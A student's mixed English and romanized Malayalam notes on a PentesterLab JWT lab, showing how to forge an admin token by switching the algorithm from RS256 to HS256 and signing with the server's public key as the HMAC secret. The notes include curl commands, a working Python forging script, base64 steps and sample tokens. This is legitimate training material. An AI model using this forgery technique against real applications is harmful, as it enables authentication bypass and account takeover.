## Introduction
-->This exercise covers the exploitation of an issue with some implementations of JWT
-->This course details the exploitation of a weakness in JSON Web Token (JWT). In this application, JWT is used for authentication. Upon successful login, the user is issued a JWT in a cookie.

## The vulnerability
-->This issue was originally discussed in the following blog post: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/.
-->In this article, Tim McLean discussed multiple issues in the signature mechanism used by JWT. In this exercise, we are going to focus on the first issue.
-->Multiple signature methods can be used to ensure the integrity of JWT:
-   RSA based
-   Elliptic curves
-   HMAC
-   None
-->Here, the application uses RSA. You can even download the public key if you want to be able to verify the token. Since you don't have the private key, you cannot generate a valid token (in theory). In a real scenario, you may get to get the public key from a JavaScript script or from a mobile application.
-->With RSA, too:
-   Sign a token, you need the private key.
-   Verify a token, you can use the public key corresponding to the private key used for the signature.
-->With HMAC, too:
-   Sign a token, you need the secret.
-   Verify a token, you need the same secret.
-->In practice, you can change the algorithm used by the application (RSA - RS256) to tell it to use HMAC (HS256).
-->The application will call the method verify when you send the cookie. Since the code is written to use RSA, it will call verify(public_key, data). But since the algorithm is set to HMAC, it will end up calling HMAC(public_key,data).
-->The application will verify the signature with the public key, but since you are forcing the application to use HMAC, it will actually verify the signature with HMAC(public_key, data).
-->As an attacker, you have everything you need to generate a valid signature since the public key is actually public.

## Exploitation
-->To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature.
-->Change the username to "admin". Then you can compute the new signature and submit your new JWT.
-->To create the correct signature, you need to look at the details of the JWT format to understand what data is signed and how it's signed.
-->The JWT format signs the base64-URL encoded without padding (https://tools.ietf.org/html/rfc7515#appendix-C) header and the base64-URL encoded without padding data, after concatenating them with a single dot ..
-->In this challenge, you have access to the public key (in the website when you're not logged in).
-->If you want to try a similar (harder) challenge without the public key provided, you can look at the [JWT XIII](https://pentesterlab.com/exercises/jwt_xiii/course) challenge.

## Conclusion
-->This exercise showed you how you can tamper with a JWT to gain administrator access in an application.
-->It showed you that having a signed value is only as strong as the weakest algorithm used, if an attacker can pick what algorithm is used.

# Video Explanation
## Video -1 jwt II exploitation(python3)
-->so lab open chyuka enit oru account undakuka.enit bur proxy il poi nokiyal kanam namuk puthiya auth session kiteetund.ath jwt token aan :
```http
Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6Impvc3UifQ.FfL9mGVuo5gt0ay2gXAYQnq_oLNW3vEm8dSRaz9QLBg2jyf5ej_QvZaiVLoflW_v6KvSquFTkACyJ-8HPpKHISnQ51HyE6S7Xy-0jKpQkguWa4zdsDBYwNh9u2M7bErpyACVGv6DrqI6X5u5Sg8rqZxbBFQeLg8WH_7tVom1HUMzRtBtM_MiItm1UdR4iXkHovo8Eb9XjYzie4-C7uVR9iZVGtZy3vEWUpf08t-9dTkHZbY3mFD7NXul9GCdVmXS6nn0KOQLkrgF27j4s0MhsWs8tBXpJug2_S-NvNz9I27aa4GKsWNdR5vLcinOEQAc0qado-7FInuT_6NzTE2xwA
```
->ivide aadyathe rand dot kazhinj sredhichal kanam valiya oru signature aan.that means ath most probably RSA algorithm aan. karnaam HMAC vechan sign chythathengil ithra valya string valrila
-->ath urapp veruthan burp decoder il itt decode chytha mathi 
-->ini logout chythal home page il thane namuk public key ctf tharunund : 
->http://ptl-ea1a9243-e9848f17.libcurl.so/public.pem
-->public key site ullath kond angane thane copy paste chyth puthiya oru .pem file il aakaruth
-->adyam kali open chyuka enit ->`curl http://ptl-683895ed-00491625.libcurl.so/public.pem`    enn kodukuka
-->apol namuk terminalil ee public key kitum.so ini same command thane adikuka enit > symbol vech oru file ilek aakuka iek
->`curl http://ptl-683895ed-00491625.libcurl.so/public.pem > key.pem`
-->ipol key.pem enna file il public key save aayi.ith ingane thane chyanam.njan copy paste chyth python code vech chythapol enik vere jwt token aan kitiyath.
-->ivide sir prathyekam parayunund ignane thane publick key file ilek aakumbol chyanamen ok
-->ini namuk python code chyam.key.pem file undakiya directory il thane python code um chyuka ok
```python
import hmac
import base64
import hashlib

f=open("key.pem")
key=f.read()

str="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0%3d"

signature= base64.urlsafe_b64encode(hmac.new(bytes(key, encoding='utf8'),str.encode('utf-8'),hashlib.sha256).digest()).decode('utf-8').rstrip("=")

print (str+"."+signature)
```
-->ini ee python code run chyanam
->`python3 jwtII.py`
-->ipol namuk puthiya jwt token kitum.ath namal namude kayil ulla token umayi replace chythal namuk admin aayi maran patum.
-->ivide str= enna variable il aan namude jwt token ile header um payloadum ullath.NOTE: header in shesham dot und but payload il dot idaruth ok
-->jwt token nokam :
```http
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InNoYSJ9.oKakJ2MOP30uqaXGBekhha8YBgRTvAk3NOn7548uj6OVrHqB05B1vGFi-LDLdGL9RBpGHXRz5OYNQc3HnLPhHgkHrRmlU7O9zrMq0nGOZbfwX_1hHEcVAQ60zZhUXpparadYyg9D8nHqbTqhezkDvPu1hyOMAhKPqMRXpMyvJwHTuU1PCDosImnvTfnU7j2RSqE_ZABtVBfM2Wy6pojjOHoFUNcarNfIygThcmhoDC-svOq5V-1FaWPeTqEx0DC3-ezEh88i0nnpPBMXTgBkSpT4Drqy6jRkpoNWghefvGJ8Lk7T9XG7R7gVFy2vpENLuXfIfzudFpGgb6JZlJKtNA
```
```
-->ee token engane aan python code il idunath enn nokam.ie, header edukuka enit :
->`echo eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9 | base64`  enn kodukuka apol header section kanikum enit athile RS256 ennath mati HS256 akkuka enit ath namal base64 il encode chyanam ie,->`echo {"typ":"JWT","alg":"HS256"} | base64`  apol namuk oru base64 encoded format il oru code kitum athan namude python script ile str varilable ile aadyathe string
-->ini payload il admin enn kodukanam so ->`echo eyJsb2dpbiI6InNoYSJ9 | base64 -d`  enn kodukuka apol namuk `{"login":"josu"}`  enn kanan patum.so josu mati admin aakanam enit base64 il encode chyanam ie->`echo {"login":"admin"} | base64`  ipol namuk oru base64 encoded code kitum athan python code ile str varialb le ile randamathe string ok
```
-->ee reethiyil chythit enik kitiyila.so njan burp il thane jwt token nte header um payloadum mati(repeater il vechit) ennit ath njan kali yil ulla jwtII.py file il(ie,namade python file) ile str= variable il replace chythapo enik admin aayi maran pati.so lab complete aayi
-->==lab completed==
## My Way
-->njan ith ente reethiyil chyan noki ie, portswigger ile last lab ekadehsam ingane aan
-->atahyath site il jwk key undakum.so ath namal eduthit new rsa key il iduka enit namuk athil ninum public key(.pem) kitum.so aa public key namal burp decoder il itt base64 encode chyum.enit namal new symmetric key koduth generate adichit "k":"ivide aa encode chytha bas64 kodukuka" enit namuk sign chyam
-->ivide ee lab il namuk already pem format il thane namuk public key kitunund.so namal nere decoder il itt base64 ecode chyuka enit new symmetric key koduth generate adikuka apol oru public key kitum.athil "k"  paramter il ulla value aan key.so aa key remove chythit namal base64 encode chytha key paste chyuka (inside double qoute)
-->Ini burp repeater il poi json web token eduthit name, algorithm oke mati sign koduthit send adikumbol enik admin aayi maran patunila.kore noki pakshe patunila.so namak sir kanikuna pole python vech thane chyunthan nallath ok
